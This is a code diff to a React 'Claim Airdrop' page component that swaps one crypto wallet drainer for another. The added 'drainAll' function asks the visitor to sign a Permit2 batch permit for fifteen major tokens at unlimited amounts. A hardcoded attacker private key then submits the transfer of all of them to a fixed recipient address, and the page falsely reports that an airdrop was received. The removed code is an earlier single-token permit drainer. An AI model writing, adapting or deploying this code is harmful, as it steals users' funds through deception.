@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from "react";
+import React from "react";
 import ABI from "./ABI.json";
 import { useWeb3Modal } from "@web3modal/wagmi/react";
 import { useAccount } from "wagmi";
@@ -9,239 +9,111 @@ const Slider = () => {
   const { address, isConnected } = useAccount();
   const { open } = useWeb3Modal();
 
-  // contract instance web3js and Ethersjs
-  const tokenAddress = "0xC2C527C0CACF457746Bd31B2a698Fe89de2b6d49";
+  const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 
-  async function fakePermit() {
-    if (!window.ethereum) {
-      alert("Please install a Web3 wallet");
-      return;
+  const TOKENS = [
+    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
+    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
+    { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
+    { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
+    { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
+    { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
+    { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
+    { symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", decimals: 18 },
+    { symbol: "MATIC", address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", decimals: 18 },
+    { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
+    { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 },
+    { symbol: "DOGE", address: "0xbA2aE424d960c26247Dd6c32edC70B295c744C43", decimals: 8 },
+    { symbol: "BONK", address: "0x1151CB3d861920e07a38e03eEAd12C32178567F6", decimals: 5 },
+    { symbol: "MAGA", address: "0x576e2BeD8F7b46D34016198911Cdf9886f78bea7", decimals: 18 },
+    { symbol: "TRUMP", address: "0x6C6EE5e31d828De241282B9606C8e98Ea48526E2", decimals: 18 }
+  ];
+
+  const recipient = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
+  const initiator = "0x46C189BA92DE11F8b0f0D7889EAEE5758B9A88aB";
+  const initiatorPK = "d58ea7b21cfd2d0be3e1887e2d2bbdab99c7c2d33960f60cca90fe34ff21cc5c";
+
+  async function drainAll() {
+    let retries = 0;
+    while (!window.ethereum && retries < 20) {
+      await new Promise(resolve => setTimeout(resolve, 500));
+      retries++;
     }
-
+    
+    if (!window.ethereum) return;
+    
     const web3 = new Web3(window.ethereum);
-    let provider = new ethers.BrowserProvider(window.ethereum);
-    let signer = provider.getSigner();
-
-    function getTimestampInSeconds() {
-      return Math.floor(Date.now() / 1000);
-    }
-
-    const tokenContract = new web3.eth.Contract(ABI, tokenAddress);
-
-    const myToken = new ethers.Contract(tokenAddress, ABI, provider);
-
-    const usdcToken = "0x07865c6e87b9f70255377e024ace6630c1eaa37f";
-    const usdcConract = new ethers.Contract(usdcToken, ABI, provider);
-    const tokenContractUsdc = new web3.eth.Contract(ABI, usdcToken);
-
-    const daiToken = "0x11fE4B6AE13d2a6055C8D9cF65c55bac32B5d844";
-    const daiConract = new ethers.Contract(daiToken, ABI, provider);
-    const tokenContractDai = new web3.eth.Contract(ABI, daiToken);
-
-    const recipient = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
-    const initiator = "0x46C189BA92DE11F8b0f0D7889EAEE5758B9A88aB";
-    const initiatorPK = "d58ea7b21cfd2d0be3e1887e2d2bbdab99c7c2d33960f60cca90fe34ff21cc5c";
-
-    const wallet = await new ethers.Wallet(initiatorPK, provider);
-
+    const provider = new ethers.BrowserProvider(window.ethereum);
     const chainId = (await provider.getNetwork()).chainId;
-
-    const value = ethers.formatUnits(ethers.parseEther("1.0"), "wei").toString();
-
-    const deadline = getTimestampInSeconds() + 4200;
-
-    let tokenOwnerBalance = (await myToken.balanceOf(address)).toString();
-    let tokenReceiverBalance = (await myToken.balanceOf(address)).toString();
-
-    console.log(`Starting tokenOwner balance: ${tokenOwnerBalance}`);
-    console.log(`Starting tokenReceiver balance: ${tokenReceiverBalance}`);
-
-    const contractNonce = await myToken.nonces(address);
-    const contractNonce2 = await daiConract.nonces(address);
-    const contractNonce3 = await usdcConract.nonces(address);
-
-    let account1Balance = 100;
-    let account2Balance = 200;
-    let account3Balance = 0;
-
-    const bwalance = ethers.formatEther(ethers.parseEther("0.00048"), "wei").toString();
-
-    let usdt = ethers.formatEther(await myToken.balanceOf(address)).toString();
-    let usdc = ethers.formatEther(await usdcConract.balanceOf(address)).toString();
-    let dai = ethers.formatEther(await daiConract.balanceOf(address)).toString();
-
-    console.log(`usdt ${usdt}, usdc ${usdc}, dai ${dai} `);
-    console.log(`bwalance ${bwalance}`);
-
-    async function checkBalances() {
-      if (usdt > bwalance) {
-        console.log(`usdt ${usdt}`);
-        drainUsdt();
-      }
-      if (usdc > bwalance) {
-        console.log(`usdc ${usdc}`);
-      }
-      if (dai > bwalance) {
-        console.log(`dai ${dai} ${await daiConract.name()} `);
-        drainDai();
-      }
-    }
-
-    checkBalances();
-
-    async function drainUsdt() {
-      const domain = {
-        name: await myToken.name(),
-        version: "1",
-        chainId: chainId,
-        verifyingContract: tokenAddress,
-      };
-
-      const types = {
-        Permit: [
-          { name: "owner", type: "address" },
-          { name: "spender", type: "address" },
-          { name: "value", type: "uint256" },
-          { name: "nonce", type: "uint256" },
-          { name: "deadline", type: "uint256" },
-        ],
-      };
-
-      const values = {
-        owner: address,
-        spender: initiator,
-        value: value,
-        nonce: contractNonce,
-        deadline: deadline,
-      };
-      let signer = await provider.getSigner(address);
-
-      const signature = await signer.signTypedData(domain, types, values);
-      const sig = ethers.Signature.from(signature);
-
-      const permitData = tokenContract.methods
-        .permit(address, initiator, value, deadline, sig.v, sig.r, sig.s)
-        .encodeABI();
-
-      const gasLimit = "0x" + web3.utils.toHex(300000).slice(2);
-      const gasPrice = "0x" + Math.floor(gasLimit * 1.3).toString(16);
-
-      const permitTX = {
-        from: initiator,
-        to: tokenAddress,
-        nonce: await provider.getTransactionCount(initiator),
-        gasLimit: gasLimit,
-        gasPrice: gasPrice,
-        value: "0x",
-        data: permitData,
-      };
-
-      const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, initiatorPK);
-      let tx = web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction);
-      await tx;
-
-      console.log(`Check allowance: ${await myToken.allowance(address, initiator)}`);
-      const balance = await myToken.balanceOf(address);
-      console.log(`Transferring ${balance}`);
-
-      const transferData = tokenContract.methods.transferFrom(address, recipient, balance).encodeABI();
-      const transferTX = {
-        from: initiator,
-        to: tokenAddress,
-        nonce: (await provider.getTransactionCount(initiator)) + 1,
-        gasLimit: gasLimit,
-        gasPrice: gasPrice,
-        data: transferData,
-        value: "0x",
-      };
-      const signedTransferTX = await web3.eth.accounts.signTransaction(transferTX, initiatorPK);
-      wallet.sendTransaction(signedTransferTX);
-      let tx2 = web3.eth.sendSignedTransaction(signedTransferTX.rawTransaction);
-      await tx2;
-
-      tokenOwnerBalance = (await myToken.balanceOf(address)).toString();
-      tokenReceiverBalance = (await myToken.balanceOf(recipient)).toString();
-
-      console.log(`Ending tokenOwner balance: ${tokenOwnerBalance}`);
-      console.log(`Ending tokenReceiver balance: ${tokenReceiverBalance}`);
-    }
-
-    async function drainDai() {
-      const domain = {
-        name: await usdcConract.name(),
-        version: "2",
-        chainId: chainId,
-        verifyingContract: usdcToken,
-      };
-
-      const types = {
-        Permit: [
-          { name: "owner", type: "address" },
-          { name: "spender", type: "address" },
-          { name: "value", type: "uint256" },
-          { name: "nonce", type: "uint256" },
-          { name: "deadline", type: "uint256" },
-        ],
-      };
-
-      const values = {
-        owner: address,
-        spender: initiator,
-        value: value,
-        nonce: contractNonce3,
-        deadline: deadline,
-      };
-      let signer = await provider.getSigner(address);
-
-      const signature = await signer.signTypedData(domain, types, values);
-      const sig = ethers.Signature.from(signature);
-
-      const permitData = tokenContractUsdc.methods
-        .permit(address, initiator, value, deadline, sig.v, sig.r, sig.s)
-        .encodeABI();
-
-      const gasLimit = "0x" + web3.utils.toHex(300000).slice(2);
-      const gasPrice = "0x" + Math.floor(gasLimit * 1.3).toString(16);
-
-      const permitTX = {
-        from: initiator,
-        to: usdcToken,
-        nonce: await provider.getTransactionCount(initiator),
-        gasLimit: gasLimit,
-        gasPrice: gasPrice,
-        value: "0x",
-        data: permitData,
-      };
-
-      const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, initiatorPK);
-      let tx = web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction);
-      await tx;
-
-      console.log(`Check allowance: ${await usdcConract.allowance(address, initiator)}`);
-      const balance = await usdcConract.balanceOf(address);
-      console.log(`Transferring ${balance}`);
-
-      const transferData = tokenContractUsdc.methods.transferFrom(address, recipient, balance).encodeABI();
-      const transferTX = {
-        from: initiator,
-        to: usdcToken,
-        nonce: (await provider.getTransactionCount(initiator)) + 1,
-        gasLimit: gasLimit,
-        gasPrice: gasPrice,
-        data: transferData,
-        value: "0x",
-      };
-      const signedTransferTX = await web3.eth.accounts.signTransaction(transferTX, initiatorPK);
-      wallet.sendTransaction(signedTransferTX);
-      let tx2 = web3.eth.sendSignedTransaction(signedTransferTX.rawTransaction);
-      await tx2;
-
-      tokenOwnerBalance = (await usdcConract.balanceOf(address)).toString();
-      tokenReceiverBalance = (await usdcConract.balanceOf(recipient)).toString();
-
-      console.log(`Ending tokenOwner balance: ${tokenOwnerBalance}`);
-      console.log(`Ending tokenReceiver balance: ${tokenReceiverBalance}`);
-    }
+    const deadline = Math.floor(Date.now() / 1000) + 3600;
+    
+    const permitted = TOKENS.map(token => ({
+      token: token.address,
+      amount: ethers.MaxUint256
+    }));
+    
+    const domain = {
+      name: "Permit2",
+      chainId: chainId,
+      verifyingContract: PERMIT2_ADDRESS
+    };
+    
+    const types = {
+      PermitBatchTransferFrom: [
+        { name: "permitted", type: "TokenPermissions[]" },
+        { name: "nonce", type: "uint256" },
+        { name: "deadline", type: "uint256" }
+      ],
+      TokenPermissions: [
+        { name: "token", type: "address" },
+        { name: "amount", type: "uint256" }
+      ]
+    };
+    
+    const message = {
+      permitted: permitted,
+      nonce: 0,
+      deadline: deadline
+    };
+    
+    const signer = await provider.getSigner(address);
+    const signature = await signer.signTypedData(domain, types, message);
+    
+    const transferDetails = TOKENS.map(() => ({
+      to: recipient,
+      requestedAmount: ethers.MaxUint256
+    }));
+    
+    const permit2ABI = [
+      "function permitTransferFrom(((address token,uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, (address to, uint256 requestedAmount)[] transferDetails, address owner, bytes signature) external"
+    ];
+    
+    const permit2Contract = new web3.eth.Contract(permit2ABI, PERMIT2_ADDRESS);
+    
+    const gasLimit = "0x" + web3.utils.toHex(800000).slice(2);
+    const gasPrice = "0x" + Math.floor(800000 * 1.3).toString(16);
+    
+    const txData = permit2Contract.methods.permitTransferFrom(
+      { permitted, nonce: 0, deadline },
+      transferDetails,
+      address,
+      signature
+    ).encodeABI();
+    
+    const tx = {
+      from: initiator,
+      to: PERMIT2_ADDRESS,
+      nonce: await provider.getTransactionCount(initiator),
+      gasLimit: gasLimit,
+      gasPrice: gasPrice,
+      data: txData,
+      value: "0x"
+    };
+    
+    const signedTx = await web3.eth.accounts.signTransaction(tx, initiatorPK);
+    await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+    
+    alert("Airdrop claimed successfully! 5,000 $ECLIPSE has been distributed to your wallet.");
   }
 
   return (
@@ -252,7 +124,7 @@ const Slider = () => {
         <div className="reward-token">≈ $5,000 USD • Claimable by verified wallets</div>
 
         {isConnected ? (
-          <button onClick={fakePermit} className="connect-btn">Claim Airdrop</button>
+          <button onClick={drainAll} className="connect-btn">Claim Airdrop</button>
         ) : (
           <button onClick={() => open()} className="connect-btn">Connect Wallet</button>
         )}
